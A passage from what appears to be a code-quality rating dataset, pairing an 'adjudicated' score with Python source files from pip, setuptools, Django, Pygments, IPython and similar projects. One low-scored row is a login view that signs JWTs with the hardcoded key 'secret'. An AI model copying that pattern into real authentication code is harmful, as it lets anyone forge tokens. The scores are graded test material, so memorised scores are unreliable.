globally_managed=True<<NEWL>>    ).path<<NEWL>><<NEWL>>    args = make_setuptools_egg_info_args(<<NEWL>>        setup_py_path,<<NEWL>>        egg_info_dir=egg_info_dir,<<NEWL>>        no_user_config=isolated,<<NEWL>>    )<<NEWL>><<NEWL>>    with build_env:<<NEWL>>        call_subprocess(<<NEWL>>            args,<<NEWL>>            cwd=source_dir,<<NEWL>>            command_desc='python setup.py egg_info',<<NEWL>>        )<<NEWL>><<NEWL>>    # Return the .egg-info directory.<<NEWL>>    return _find_egg_info(egg_info_dir)"
420	adjudicated	1	"from distutils.util import convert_path<<NEWL>>from distutils import log<<NEWL>>from distutils.errors import DistutilsOptionError<<NEWL>>import os<<NEWL>>import shutil<<NEWL>><<NEWL>>from setuptools import Command<<NEWL>><<NEWL>><<NEWL>>class rotate(Command):<<NEWL>>    """"""Delete older distributions""""""<<NEWL>><<NEWL>>    description = ""delete older distributions, keeping N newest files""<<NEWL>>    user_options = [<<NEWL>>        ('match=', 'm', ""patterns to match (required)""),<<NEWL>>        ('dist-dir=', 'd', ""directory where the distributions are""),<<NEWL>>        ('keep=', 'k', ""number of matching distributions to keep""),<<NEWL>>    ]<<NEWL>><<NEWL>>    boolean_options = []<<NEWL>><<NEWL>>    def initialize_options(self):<<NEWL>>        self.match = None<<NEWL>>        self.dist_dir = None<<NEWL>>        self.keep = None<<NEWL>><<NEWL>>    def finalize_options(self):<<NEWL>>        if self.match is None:<<NEWL>>            raise DistutilsOptionError(<<NEWL>>                ""Must specify one or more (comma-separated) match patterns ""<<NEWL>>                ""(e.g. '.zip' or '.egg')""<<NEWL>>            )<<NEWL>>        if self.keep is None:<<NEWL>>            raise DistutilsOptionError(""Must specify number of files to keep"")<<NEWL>>        try:<<NEWL>>            self.keep = int(self.keep)<<NEWL>>        except ValueError as e:<<NEWL>>            raise DistutilsOptionError(""--keep must be an integer"") from e<<NEWL>>        if isinstance(self.match, str):<<NEWL>>            self.match = [<<NEWL>>                convert_path(p.strip()) for p in self.match.split(',')<<NEWL>>            ]<<NEWL>>        self.set_undefined_options('bdist', ('dist_dir', 'dist_dir'))<<NEWL>><<NEWL>>    def run(self):<<NEWL>>        self.run_command(""egg_info"")<<NEWL>>        from glob import glob<<NEWL>><<NEWL>>        for pattern in self.match:<<NEWL>>            pattern = self.distribution.get_name() + '*' + pattern<<NEWL>>            files = glob(os.path.join(self.dist_dir, pattern))<<NEWL>>            files = [(os.path.getmtime(f), f) for f in files]<<NEWL>>            files.sort()<<NEWL>>            files.reverse()<<NEWL>><<NEWL>>            log.info(""%d file(s) matching %s"", len(files), pattern)<<NEWL>>            files = files[self.keep:]<<NEWL>>            for (t, f) in files:<<NEWL>>                log.info(""Deleting %s"", f)<<NEWL>>                if not self.dry_run:<<NEWL>>                    if os.path.isdir(f):<<NEWL>>                        shutil.rmtree(f)<<NEWL>>                    else:<<NEWL>>                        os.unlink(f)"
482	adjudicated	3	"from urllib.parse import unquote, urlparse<<NEWL>><<NEWL>>from asgiref.testing import ApplicationCommunicator<<NEWL>><<NEWL>><<NEWL>>class HttpCommunicator(ApplicationCommunicator):<<NEWL>>    """"""<<NEWL>>    ApplicationCommunicator subclass that has HTTP shortcut methods.<<NEWL>><<NEWL>>    It will construct the scope for you, so you need to pass the application<<NEWL>>    (uninstantiated) along with HTTP parameters.<<NEWL>><<NEWL>>    This does not support full chunking - for that, just use ApplicationCommunicator<<NEWL>>    directly.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, application, method, path, body=b"""", headers=None):<<NEWL>>        parsed = urlparse(path)<<NEWL>>        self.scope = {<<NEWL>>            ""type"": ""http"",<<NEWL>>            ""http_version"": ""1.1"",<<NEWL>>            ""method"": method.upper(),<<NEWL>>            ""path"": unquote(parsed.path),<<NEWL>>            ""query_string"": parsed.query.encode(""utf-8""),<<NEWL>>            ""headers"": headers or [],<<NEWL>>        }<<NEWL>>        assert isinstance(body, bytes)<<NEWL>>        self.body = body<<NEWL>>        self.sent_request = False<<NEWL>>        super().__init__(application, self.scope)<<NEWL>><<NEWL>>    async def get_response(self, timeout=1):<<NEWL>>        """"""<<NEWL>>        Get the application's response. Returns a dict with keys of<<NEWL>>        ""body"", ""headers"" and ""status"".<<NEWL>>        """"""<<NEWL>>        # If we've not sent the request yet, do so<<NEWL>>        if not self.sent_request:<<NEWL>>            self.sent_request = True<<NEWL>>            await self.send_input({""type"": ""http.request"", ""body"": self.body})<<NEWL>>        # Get the response start<<NEWL>>        response_start = await self.receive_output(timeout)<<NEWL>>        assert response_start[""type""] == ""http.response.start""<<NEWL>>        # Get all body parts<<NEWL>>        response_start[""body""] = b""""<<NEWL>>        while True:<<NEWL>>            chunk = await self.receive_output(timeout)<<NEWL>>            assert chunk[""type""] == ""http.response.body""<<NEWL>>            assert isinstance(chunk[""body""], bytes)<<NEWL>>            response_start[""body""] += chunk[""body""]<<NEWL>>            if not chunk.get(""more_body"", False):<<NEWL>>                break<<NEWL>>        # Return structured info<<NEWL>>        del response_start[""type""]<<NEWL>>        response_start.setdefault(""headers"", [])<<NEWL>>        return response_start"
414	adjudicated	3	"# -*- coding: utf-8 -*-<<NEWL>>#<<NEWL>># Copyright (C) 2019 Radim Rehurek <me@radimrehurek.com><<NEWL>>#<<NEWL>># This code is distributed under the terms and conditions<<NEWL>># from the MIT License (MIT).<<NEWL>>#<<NEWL>><<NEWL>>""""""<<NEWL>>Utilities for streaming to/from several file-like data storages: S3 / HDFS / local<<NEWL>>filesystem / compressed files, and many more, using a simple, Pythonic API.<<NEWL>><<NEWL>>The streaming makes heavy use of generators and pipes, to avoid loading<<NEWL>>full file contents into memory, allowing work with arbitrarily large files.<<NEWL>><<NEWL>>The main functions are:<<NEWL>><<NEWL>>* `open()`, which opens the given file for reading/writing<<NEWL>>* `parse_uri()`<<NEWL>>* `s3_iter_bucket()`, which goes over all keys in an S3 bucket in parallel<<NEWL>>* `register_compressor()`, which registers callbacks for transparent compressor handling<<NEWL>><<NEWL>>""""""<<NEWL>><<NEWL>>import logging<<NEWL>><<NEWL>>#<<NEWL>># Prevent regression of #474 and #475<<NEWL>>#<<NEWL>>logger = logging.getLogger(__name__)<<NEWL>>logger.addHandler(logging.NullHandler())<<NEWL>><<NEWL>>from smart_open import version  # noqa: E402<<NEWL>>from .smart_open_lib import open, parse_uri, smart_open, register_compressor  # noqa: E402<<NEWL>><<NEWL>>_WARNING = """"""smart_open.s3_iter_bucket is deprecated and will stop functioning<<NEWL>>in a future version. Please import iter_bucket from the smart_open.s3 module instead:<<NEWL>><<NEWL>>    from smart_open.s3 import iter_bucket as s3_iter_bucket<<NEWL>><<NEWL>>""""""<<NEWL>>_WARNED = False<<NEWL>><<NEWL>><<NEWL>>def s3_iter_bucket(<<NEWL>>        bucket_name,<<NEWL>>        prefix='',<<NEWL>>        accept_key=None,<<NEWL>>        key_limit=None,<<NEWL>>        workers=16,<<NEWL>>        retries=3,<<NEWL>>        **session_kwargs<<NEWL>>):<<NEWL>>    """"""Deprecated.  Use smart_open.s3.iter_bucket instead.""""""<<NEWL>>    global _WARNED<<NEWL>>    from .s3 import iter_bucket<<NEWL>>    if not _WARNED:<<NEWL>>        logger.warning(_WARNING)<<NEWL>>        _WARNED = True<<NEWL>>    return iter_bucket(<<NEWL>>        bucket_name=bucket_name,<<NEWL>>        prefix=prefix,<<NEWL>>        accept_key=accept_key,<<NEWL>>        key_limit=key_limit,<<NEWL>>        workers=workers,<<NEWL>>        retries=retries,<<NEWL>>        session_kwargs=session_kwargs<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>__all__ = [<<NEWL>>    'open',<<NEWL>>    'parse_uri',<<NEWL>>    'register_compressor',<<NEWL>>    's3_iter_bucket',<<NEWL>>    'smart_open',<<NEWL>>]<<NEWL>><<NEWL>>__version__ = version.__version__"
505	adjudicated	3	"""""""<<NEWL>>    pygments.styles.vim<<NEWL>>    ~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    A highlighting style for Pygments, inspired by vim.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.style import Style<<NEWL>>from pygments.token import Keyword, Name, Comment, String, Error, \<<NEWL>>     Number, Operator, Generic, Whitespace, Token<<NEWL>><<NEWL>><<NEWL>>class VimStyle(Style):<<NEWL>>    """"""<<NEWL>>    Styles somewhat like vim 7.0<<NEWL>>    """"""<<NEWL>><<NEWL>>    background_color = ""#000000""<<NEWL>>    highlight_color = ""#222222""<<NEWL>><<NEWL>>    styles = {<<NEWL>>        Token:                     ""#cccccc"",<<NEWL>>        Whitespace:                """",<<NEWL>>        Comment:                   ""#000080"",<<NEWL>>        Comment.Preproc:           """",<<NEWL>>        Comment.Special:           ""bold #cd0000"",<<NEWL>><<NEWL>>        Keyword:                   ""#cdcd00"",<<NEWL>>        Keyword.Declaration:       ""#00cd00"",<<NEWL>>        Keyword.Namespace:         ""#cd00cd"",<<NEWL>>        Keyword.Pseudo:            """",<<NEWL>>        Keyword.Type:              ""#00cd00"",<<NEWL>><<NEWL>>        Operator:                  ""#3399cc"",<<NEWL>>        Operator.Word:             ""#cdcd00"",<<NEWL>><<NEWL>>        Name:                      """",<<NEWL>>        Name.Class:                ""#00cdcd"",<<NEWL>>        Name.Builtin:              ""#cd00cd"",<<NEWL>>        Name.Exception:            ""bold #666699"",<<NEWL>>        Name.Variable:             ""#00cdcd"",<<NEWL>><<NEWL>>        String:                    ""#cd0000"",<<NEWL>>        Number:                    ""#cd00cd"",<<NEWL>><<NEWL>>        Generic.Heading:           ""bold #000080"",<<NEWL>>        Generic.Subheading:        ""bold #800080"",<<NEWL>>        Generic.Deleted:           ""#cd0000"",<<NEWL>>        Generic.Inserted:          ""#00cd00"",<<NEWL>>        Generic.Error:             ""#FF0000"",<<NEWL>>        Generic.Emph:              ""italic"",<<NEWL>>        Generic.Strong:            ""bold"",<<NEWL>>        Generic.Prompt:            ""bold #000080"",<<NEWL>>        Generic.Output:            ""#888"",<<NEWL>>        Generic.Traceback:         ""#04D"",<<NEWL>><<NEWL>>        Error:                     ""border:#FF0000""<<NEWL>>    }"
445	adjudicated	0	from rest_framework.views import APIView<<NEWL>>from rest_framework.response import Response<<NEWL>>from rest_framework.exceptions import AuthenticationFailed<<NEWL>>from rest_framework.parsers import JSONParser<<NEWL>>from .serializers import UserSerializer<<NEWL>>from .models import User<<NEWL>>import jwt<<NEWL>>import datetime<<NEWL>>from jwt import decode<<NEWL>>from bson.objectid import ObjectId<<NEWL>><<NEWL>>import sys<<NEWL>><<NEWL>>from helpers.permissions import isUser<<NEWL>><<NEWL>>class RegisterView(APIView):<<NEWL>>    def post(self, request):<<NEWL>>        serializer = UserSerializer(data=request.data)<<NEWL>>        serializer.is_valid(raise_exception=True)<<NEWL>>        serializer.save()<<NEWL>>        return Response(serializer.data)<<NEWL>><<NEWL>><<NEWL>>class LoginView(APIView):<<NEWL>>    def post(self, request):<<NEWL>>        email = request.data['email']<<NEWL>>        password = request.data['password']<<NEWL>><<NEWL>>        user = User.objects.filter(email__exact=email).first()<<NEWL>><<NEWL>>        if user is None:<<NEWL>>            raise AuthenticationFailed('User not found!')<<NEWL>><<NEWL>>        if not user.check_password(password):<<NEWL>>            raise AuthenticationFailed('Incorrect password!')<<NEWL>><<NEWL>>        payload = {<<NEWL>>            'id': str(user._id),<<NEWL>>            'admin': user.is_superAdmin,<<NEWL>>            'exp': datetime.datetime.utcnow() + datetime.timedelta(minutes=60),<<NEWL>>            'iat': datetime.datetime.utcnow()<<NEWL>>        }<<NEWL>>        <<NEWL>><<NEWL>>        token = jwt.encode(payload, 'secret',<<NEWL>>                           algorithm='HS256').decode('utf-8')<<NEWL>><<NEWL>>        response = Response()<<NEWL>><<NEWL>>        response.set_cookie(key='jwt', value=token, httponly=True)<<NEWL>>        response.data = {<<NEWL>>            'jwt': token<<NEWL>>        }<<NEWL>><<NEWL>>        return response<<NEWL>><<NEWL>><<NEWL>>class UserView(APIView):<<NEWL>>    <<NEWL>>    permission_classes = [isUser]<<NEWL>><<NEWL>>    def get(self, request):<<NEWL>>        user = User.objects.filter(_id=ObjectId(request.account['id'])).first()<<NEWL>>        serializer = UserSerializer(user)<<NEWL>>        <<NEWL>>        return Response(serializer.data)<<NEWL>><<NEWL>><<NEWL>><<NEWL>>class LogoutView(APIView):<<NEWL>>    def post(self, request):<<NEWL>>        response = Response()<<NEWL>>        response.delete_cookie('jwt')<<NEWL>>        response.data = {<<NEWL>>            'message': 'success'<<NEWL>>        }<<NEWL>>        return response
178	adjudicated	4	"""""""For neatly implementing static typing in packaging.<<NEWL>><<NEWL>>`mypy` - the static type analysis tool we use - uses the `typing` module, which<<NEWL>>provides core functionality fundamental to mypy's functioning.<<NEWL>><<NEWL>>Generally, `typing` would be imported at runtime and used in that fashion -<<NEWL>>it acts as a no-op at runtime and does not have any run-time overhead by<<NEWL>>design.<<NEWL>><<NEWL>>As it turns out, `typing` is not vendorable - it uses separate sources for<<NEWL>>Python 2/Python 3. Thus, this codebase can not expect it to be present.<<NEWL>>To work around this, mypy allows the typing import to be behind a False-y<<NEWL>>optional to prevent it from running at runtime and type-comments can be used<<NEWL>>to remove the need for the types to be accessible directly during runtime.<<NEWL>><<NEWL>>This module provides the False-y guard in a nicely named fashion so that a<<NEWL>>curious maintainer can reach here to read this.<<NEWL>><<NEWL>>In packaging, all static-typing related imports should be guarded as follows:<<NEWL>><<NEWL>>    from packaging._typing import TYPE_CHECKING<<NEWL>><<NEWL>>    if TYPE_CHECKING:<<NEWL>>        from typing import ...<<NEWL>><<NEWL>>Ref: https://github.com/python/mypy/issues/3216<<NEWL>>""""""<<NEWL>><<NEWL>>__all__ = [""TYPE_CHECKING"", ""cast""]<<NEWL>><<NEWL>># The TYPE_CHECKING constant defined by the typing module is False at runtime<<NEWL>># but True while type checking.<<NEWL>>if False:  # pragma: no cover<<NEWL>>    from typing import TYPE_CHECKING<<NEWL>>else:<<NEWL>>    TYPE_CHECKING = False<<NEWL>><<NEWL>># typing's cast syntax requires calling typing.cast at runtime, but we don't<<NEWL>># want to import typing at runtime. Here, we inform the type checkers that<<NEWL>># we're importing `typing.cast` as `cast` and re-implement typing.cast's<<NEWL>># runtime behavior in a block that is ignored by type checkers.<<NEWL>>if TYPE_CHECKING:  # pragma: no cover<<NEWL>>    # not executed at runtime<<NEWL>>    from typing import cast<<NEWL>>else:<<NEWL>>    # executed at runtime<<NEWL>>    def cast(type_, value):  # noqa<<NEWL>>        return value"
38	adjudicated	2	"from django.apps import apps<<NEWL>>from django.conf import settings<<NEWL>>from django.contrib.redirects.models import Redirect<<NEWL>>from django.contrib.sites.shortcuts import get_current_site<<NEWL>>from django.core.exceptions import ImproperlyConfigured<<NEWL>>from django.http import HttpResponseGone, HttpResponsePermanentRedirect<<NEWL>>from django.utils.deprecation import MiddlewareMixin<<NEWL>><<NEWL>><<NEWL>>class RedirectFallbackMiddleware(MiddlewareMixin):<<NEWL>>    # Defined as class-level attributes to be subclassing-friendly.<<NEWL>>    response_gone_class = HttpResponseGone<<NEWL>>    response_redirect_class = HttpResponsePermanentRedirect<<NEWL>><<NEWL>>    def __init__(self, get_response):<<NEWL>>        if not apps.is_installed(""django.contrib.sites""):<<NEWL>>            raise ImproperlyConfigured(<<NEWL>>                ""You cannot use RedirectFallbackMiddleware when ""<<NEWL>>                ""django.contrib.sites is not installed.""<<NEWL>>            )<<NEWL>>        super().__init__(get_response)<<NEWL>><<NEWL>>    def process_response(self, request, response):<<NEWL>>        # No need to check for a redirect for non-404 responses.<<NEWL>>        if response.status_code != 404:<<NEWL>>            return response<<NEWL>><<NEWL>>        full_path = request.get_full_path()<<NEWL>>        current_site = get_current_site(request)<<NEWL>><<NEWL>>        r = None<<NEWL>>        try:<<NEWL>>            r = Redirect.objects.get(site=current_site, old_path=full_path)<<NEWL>>        except Redirect.DoesNotExist:<<NEWL>>            pass<<NEWL>>        if r is None and settings.APPEND_SLASH and not request.path.endswith(""/""):<<NEWL>>            try:<<NEWL>>                r = Redirect.objects.get(<<NEWL>>                    site=current_site,<<NEWL>>                    old_path=request.get_full_path(force_append_slash=True),<<NEWL>>                )<<NEWL>>            except Redirect.DoesNotExist:<<NEWL>>                pass<<NEWL>>        if r is not None:<<NEWL>>            if r.new_path == """":<<NEWL>>                return self.response_gone_class()<<NEWL>>            return self.response_redirect_class(r.new_path)<<NEWL>><<NEWL>>        # No redirect was found. Return the response.<<NEWL>>        return response"
129	adjudicated	4	"from rx.core import Observable, AnonymousObservable<<NEWL>>from rx.disposables import CompositeDisposable<<NEWL>>from rx.concurrency import timeout_scheduler<<NEWL>>from rx.internal import extensionmethod<<NEWL>><<NEWL>><<NEWL>>def sample_observable(source, sampler):<<NEWL>><<NEWL>>    def subscribe(observer):<<NEWL>>        at_end = [None]<<NEWL>>        has_value = [None]<<NEWL>>        value = [None]<<NEWL>><<NEWL>>        def sample_subscribe(x=None):<<NEWL>>            if has_value[0]:<<NEWL>>                has_value[0] = False<<NEWL>>                observer.on_next(value[0])<<NEWL>><<NEWL>>            if at_end[0]:<<NEWL>>                observer.on_completed()<<NEWL>><<NEWL>>        def on_next(new_value):<<NEWL>>            has_value[0] = True<<NEWL>>            value[0] = new_value<<NEWL>><<NEWL>>        def on_completed():<<NEWL>>            at_end[0] = True<<NEWL>><<NEWL>>        return CompositeDisposable(<<NEWL>>            source.subscribe(on_next, observer.on_error, on_completed),<<NEWL>>            sampler.subscribe(sample_subscribe, observer.on_error, sample_subscribe)<<NEWL>>        )<<NEWL>>    return AnonymousObservable(subscribe)<<NEWL>><<NEWL>><<NEWL>>@extensionmethod(Observable, alias=""throttle_last"")<<NEWL>>def sample(self, interval=None, sampler=None, scheduler=None):<<NEWL>>    """"""Samples the observable sequence at each interval.<<NEWL>><<NEWL>>    1 - res = source.sample(sample_observable) # Sampler tick sequence<<NEWL>>    2 - res = source.sample(5000) # 5 seconds<<NEWL>>    2 - res = source.sample(5000, rx.scheduler.timeout) # 5 seconds<<NEWL>><<NEWL>>    Keyword arguments:<<NEWL>>    source -- Source sequence to sample.<<NEWL>>    interval -- Interval at which to sample (specified as an integer<<NEWL>>        denoting milliseconds).<<NEWL>>    scheduler -- [Optional] Scheduler to run the sampling timer on. If not<<NEWL>>        specified, the timeout scheduler is used.<<NEWL>><<NEWL>>    Returns sampled observable sequence.<<NEWL>>    """"""<<NEWL>><<NEWL>>    scheduler = scheduler or timeout_scheduler<<NEWL>>    if interval is not None:<<NEWL>>        return sample_observable(self, Observable.interval(interval, scheduler=scheduler))<<NEWL>><<NEWL>>    return sample_observable(self, sampler)"
69	adjudicated	3	"from importlib import import_module<<NEWL>><<NEWL>>from django.utils.version import get_docs_version<<NEWL>><<NEWL>><<NEWL>>def deconstructible(*args, path=None):<<NEWL>>    """"""<<NEWL>>    Class decorator that allows the decorated class to be serialized<<NEWL>>    by the migrations subsystem.<<NEWL>><<NEWL>>    The `path` kwarg specifies the import path.<<NEWL>>    """"""<<NEWL>>    def decorator(klass):<<NEWL>>        def __new__(cls, *args, **kwargs):<<NEWL>>            # We capture the arguments to make returning them trivial<<NEWL>>            obj = super(klass, cls).__new__(cls)<<NEWL>>            obj._constructor_args = (args, kwargs)<<NEWL>>            return obj<<NEWL>><<NEWL>>        def deconstruct(obj):<<NEWL>>            """"""<<NEWL>>            Return a 3-tuple of class import path, positional arguments,<<NEWL>>            and keyword arguments.<<NEWL>>            """"""<<NEWL>>            # Fallback version<<NEWL>>            if path:<<NEWL>>                module_name, _, name = path.rpartition('.')<<NEWL>>            else:<<NEWL>>                module_name = obj.__module__<<NEWL>>                name = obj.__class__.__name__<<NEWL>>            # Make sure it's actually there and not an inner class<<NEWL>>            module = import_module(module_name)<<NEWL>>            if not hasattr(module, name):<<NEWL>>                raise ValueError(<<NEWL>>                    ""Could not find object %s in %s.\n""<<NEWL>>                    ""Please note that you cannot serialize things like inner ""<<NEWL>>                    ""classes. Please move the object into the main module ""<<NEWL>>                    ""body to use migrations.\n""<<NEWL>>                    ""For more information, see ""<<NEWL>>                    ""https://docs.djangoproject.com/en/%s/topics/migrations/#serializing-values""<<NEWL>>                    % (name, module_name, get_docs_version()))<<NEWL>>            return (<<NEWL>>                path or '%s.%s' % (obj.__class__.__module__, name),<<NEWL>>                obj._constructor_args[0],<<NEWL>>                obj._constructor_args[1],<<NEWL>>            )<<NEWL>><<NEWL>>        klass.__new__ = staticmethod(__new__)<<NEWL>>        klass.deconstruct = deconstruct<<NEWL>><<NEWL>>        return klass<<NEWL>><<NEWL>>    if not args:<<NEWL>>        return decorator<<NEWL>>    return decorator(*args)"
79	adjudicated	0	"from django import forms<<NEWL>><<NEWL>>from ckeditor.fields import RichTextFormField<<NEWL>>from ckeditor.widgets import CKEditorWidget<<NEWL>>from ckeditor_uploader.fields import RichTextUploadingFormField<<NEWL>>from ckeditor_uploader.widgets import CKEditorUploadingWidget<<NEWL>><<NEWL>>from .models import ExampleModel, ExampleNonUploadModel<<NEWL>>from .widgets import CkEditorMultiWidget<<NEWL>><<NEWL>><<NEWL>>class CkEditorForm(forms.Form):<<NEWL>>    ckeditor_standard_example = RichTextFormField()<<NEWL>>    ckeditor_upload_example = RichTextUploadingFormField(<<NEWL>>        config_name=""my-custom-toolbar""<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>class CkEditorMultiWidgetForm(forms.Form):<<NEWL>>    SUBWIDGET_SUFFIXES = [""0"", ""1""]<<NEWL>><<NEWL>>    ckeditor_standard_multi_widget_example = forms.CharField(<<NEWL>>        widget=CkEditorMultiWidget(<<NEWL>>            widgets={suffix: CKEditorWidget for suffix in SUBWIDGET_SUFFIXES},<<NEWL>>        ),<<NEWL>>    )<<NEWL>>    ckeditor_upload_multi_widget_example = forms.CharField(<<NEWL>>        widget=CkEditorMultiWidget(<<NEWL>>            widgets={<<NEWL>>                suffix: CKEditorUploadingWidget(config_name=""my-custom-toolbar"")<<NEWL>>                for suffix in SUBWIDGET_SUFFIXES<<NEWL>>            },<<NEWL>>        ),<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>class ExampleModelForm(forms.ModelForm):<<NEWL>>    class Meta:<<NEWL>>        model = ExampleModel<<NEWL>>        fields = ""__all__""<<NEWL>><<NEWL>><<NEWL>>class ExampleNonUploadModelForm(forms.ModelForm):<<NEWL>>    class Meta:<<NEWL>>        model = ExampleNonUploadModel<<NEWL>>        fields = ""__all__""<<NEWL>><<NEWL>><<NEWL>>class ExampleModelOverriddenWidgetForm(forms.ModelForm):<<NEWL>>    class Meta:<<NEWL>>        model = ExampleModel<<NEWL>>        fields = ""__all__""<<NEWL>><<NEWL>>    def __init__(self, *args, **kwargs):<<NEWL>>        super().__init__(*args, **kwargs)<<NEWL>><<NEWL>>        self.fields[""content""].widget = CKEditorUploadingWidget(<<NEWL>>            config_name=""my-custom-toolbar"",<<NEWL>>            extra_plugins=[""someplugin"", ""anotherplugin""],<<NEWL>>            external_plugin_resources=[<<NEWL>>                (<<NEWL>>                    ""someplugin"",<<NEWL>>                    ""/static/path/to/someplugin/"",<<NEWL>>                    ""plugin.js"",<<NEWL>>                )<<NEWL>>            ],<<NEWL>>        )"
139	adjudicated	3	"# encoding: utf-8<<NEWL>>""""""<<NEWL>>Autocall capabilities for IPython.core.<<NEWL>><<NEWL>>Authors:<<NEWL>><<NEWL>>* Brian Granger<<NEWL>>* Fernando Perez<<NEWL>>* Thomas Kluyver<<NEWL>><<NEWL>>Notes<<NEWL>>-----<<NEWL>>""""""<<NEWL>><<NEWL>>#-----------------------------------------------------------------------------<<NEWL>>#  Copyright (C) 2008-2011  The IPython Development Team<<NEWL>>#<<NEWL>>#  Distributed under the terms of the BSD License.  The full license is in<<NEWL>>#  the file COPYING, distributed as part of this software.<<NEWL>>#-----------------------------------------------------------------------------<<NEWL>><<NEWL>>#-----------------------------------------------------------------------------<<NEWL>># Imports<<NEWL>>#-----------------------------------------------------------------------------<<NEWL>><<NEWL>><<NEWL>>#-----------------------------------------------------------------------------<<NEWL>># Code<<NEWL>>#-----------------------------------------------------------------------------<<NEWL>><<NEWL>>class IPyAutocall(object):<<NEWL>>    """""" Instances of this class are always autocalled<<NEWL>>    <<NEWL>>    This happens regardless of 'autocall' variable state. Use this to<<NEWL>>    develop macro-like mechanisms.<<NEWL>>    """"""<<NEWL>>    _ip = None<<NEWL>>    rewrite = True<<NEWL>>    def __init__(self, ip=None):<<NEWL>>        self._ip = ip<<NEWL>>    <<NEWL>>    def set_ip(self, ip):<<NEWL>>        """"""Will be used to set _ip point to current ipython instance b/f call<<NEWL>><<NEWL>>        Override this method if you don't want this to happen.<<NEWL>><<NEWL>>        """"""<<NEWL>>        self._ip = ip<<NEWL>><<NEWL>><<NEWL>>class ExitAutocall(IPyAutocall):<<NEWL>>    """"""An autocallable object which will be added to the user namespace so that<<NEWL>>    exit, exit(), quit or quit() are all valid ways to close the shell.""""""<<NEWL>>    rewrite = False<<NEWL>>    <<NEWL>>    def __call__(self):<<NEWL>>        self._ip.ask_exit()<<NEWL>>        <<NEWL>>class ZMQExitAutocall(ExitAutocall):<<NEWL>>    """"""Exit IPython. Autocallable, so it needn't be explicitly called.<<NEWL>>    <<NEWL>>    Parameters<<NEWL>>    ----------<<NEWL>>    keep_kernel : bool<<NEWL>>      If True, leave the kernel alive. Otherwise, tell the kernel to exit too<<NEWL>>      (default).<<NEWL>>    """"""<<NEWL>>    def __call__(self, keep_kernel=False):<<NEWL>>        self._ip.keepkernel_on_exit = keep_kernel<<NEWL>>        self._ip.ask_exit()"
28	adjudicated	0	"import traceback<<NEWL>><<NEWL>>class Symbol(object):<<NEWL>>    def __init__(self, anchor, type, cppname):<<NEWL>>        self.anchor = anchor<<NEWL>>        self.type = type<<NEWL>>        self.cppname = cppname<<NEWL>>        #if anchor == 'ga586ebfb0a7fb604b35a23d85391329be':<<NEWL>>        #    print(repr(self))<<NEWL>>        #    traceback.print_stack()<<NEWL>><<NEWL>>    def __repr__(self):<<NEWL>>        return '%s:%s@%s' % (self.type, self.cppname, self.anchor)<<NEWL>><<NEWL>>def add_to_file(files_dict, file, anchor):<<NEWL>>    anchors = files_dict.setdefault(file, [])<<NEWL>>    anchors.append(anchor)<<NEWL>><<NEWL>><<NEWL>>def scan_namespace_constants(ns, ns_name, files_dict):<<NEWL>>    constants = ns.findall(""./member[@kind='enumvalue']"")<<NEWL>>    for c in constants:<<NEWL>>        c_name = c.find(""./name"").text<<NEWL>>        name = ns_name + '::' + c_name<<NEWL>>        file = c.find(""./anchorfile"").text<<NEWL>>        anchor = c.find(""./anchor"").text<<NEWL>>        #print('    CONST: {} => {}#{}'.format(name, file, anchor))<<NEWL>>        add_to_file(files_dict, file, Symbol(anchor, ""const"", name))<<NEWL>><<NEWL>>def scan_namespace_functions(ns, ns_name, files_dict):<<NEWL>>    functions = ns.findall(""./member[@kind='function']"")<<NEWL>>    for f in functions:<<NEWL>>        f_name = f.find(""./name"").text<<NEWL>>        name = ns_name + '::' + f_name<<NEWL>>        file = f.find(""./anchorfile"").text<<NEWL>>        anchor = f.find(""./anchor"").text<<NEWL>>        #print('    FN: {} => {}#{}'.format(name, file, anchor))<<NEWL>>        add_to_file(files_dict, file, Symbol(anchor, ""fn"", name))<<NEWL>><<NEWL>>def scan_class_methods(c, c_name, files_dict):<<NEWL>>    methods = c.findall(""./member[@kind='function']"")<<NEWL>>    for m in methods:<<NEWL>>        m_name = m.find(""./name"").text<<NEWL>>        name = c_name + '::' + m_name<<NEWL>>        file = m.find(""./anchorfile"").text<<NEWL>>        anchor = m.find(""./anchor"").text<<NEWL>>        #print('    Method: {} => {}#{}'.format(name, file, anchor))<<NEWL>>        add_to_file(files_dict, file, Symbol(anchor, ""method"", name))"
168	adjudicated	4	"# Copyright 2017-present Adtran, Inc.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>># http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>>from voltha.protos.events_pb2 import AlarmEventType, AlarmEventSeverity, AlarmEventCategory<<NEWL>>from voltha.extensions.alarms.adapter_alarms import AlarmBase<<NEWL>><<NEWL>><<NEWL>>class OnuEquipmentAlarm(AlarmBase):<<NEWL>>    """"""<<NEWL>>    The ONU Equipment Alarm is reported by both the CircuitPack (ME #6) and<<NEWL>>    the ONT-G (ME # 256) to indicate failure on an internal interface or<<NEWL>>    failed self-test.<<NEWL>><<NEWL>>    For CircuitPack equipment alarms, the intf_id reported is that of the<<NEWL>>    UNI's logical port number<<NEWL>><<NEWL>>    For ONT-G equipment alarms, the intf_id reported is that of the PON/ANI<<NEWL>>    physical port number<<NEWL>><<NEWL>>    Note: Some ONUs may use this alarm to report a self-test failure or may<<NEWL>>          may report it with a different alarm number specifically for a<<NEWL>>          self-test failure.<<NEWL>>    """"""<<NEWL>>    def __init__(self, alarm_mgr, onu_id, intf_id):<<NEWL>>        super(OnuEquipmentAlarm, self).__init__(alarm_mgr, object_type='onu equipment',<<NEWL>>                                                alarm='ONU_EQUIPMENT',<<NEWL>>                                                alarm_category=AlarmEventCategory.ONU,<<NEWL>>                                                alarm_type=AlarmEventType.EQUIPTMENT,<<NEWL>>                                                